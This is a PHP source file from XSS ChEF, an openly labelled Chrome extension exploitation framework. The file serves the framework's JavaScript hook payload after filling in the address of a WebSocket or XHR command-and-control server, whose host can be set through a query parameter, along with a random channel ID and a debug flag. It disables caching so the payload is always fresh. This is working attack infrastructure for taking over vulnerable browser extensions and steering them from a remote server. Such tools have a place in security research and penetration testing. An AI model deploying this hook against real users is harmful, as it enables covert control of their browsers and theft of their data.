<?php
/*
    XSS ChEF - Chrome Extension Exploitation framework
    Copyright (C) 2012  Krzysztof Kotowicz - http://blog.kotowicz.net

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
$script = file_get_contents('xsschef.js');
$server_type = !empty($_GET['t']) ? $_GET['t'] : 'ws';
$ws_host = !empty($_GET['h']) ? $_GET['h'] : preg_replace('/\:.*/', '', $_SERVER['HTTP_HOST']) . ':8080';
$debug = array_key_exists('dbg', $_GET);

switch ($server_type) {
    case 'xhr':
        $url = ($_SERVER['HTTPS'] ? "https://" : "http://") . $_SERVER['HTTP_HOST'] . str_replace('/hook.php', '/server-xhr.php', $_SERVER['SCRIPT_NAME']);
        break;
    case 'ws':
    default:    
        $url = ($_SERVER['HTTPS'] ? "wss://" : "ws://") . $ws_host . '/chef'; 
}

$ch = 'c'.crc32(rand() . time());
$script = str_replace('__URL__', $url, $script);
$script = str_replace('__CHANNEL__', $ch, $script);
$script = str_replace('__CMD_CHANNEL__', $ch . '-cmd', $script);
$script = str_replace('__DEBUG__', ($debug ? '1': ''), $script);

header('Content-Type: text/javascript');
header( 'Expires: Sat, 26 Jul 1997 05:00:00 GMT' ); 
header( 'Last-Modified: ' . gmdate( 'D, d M Y H:i:s' ) . ' GMT' ); 
header( 'Cache-Control: no-store, no-cache, must-revalidate' ); 
header( 'Cache-Control: post-check=0, pre-check=0', false ); 
header( 'Pragma: no-cache' );
echo $script;
?>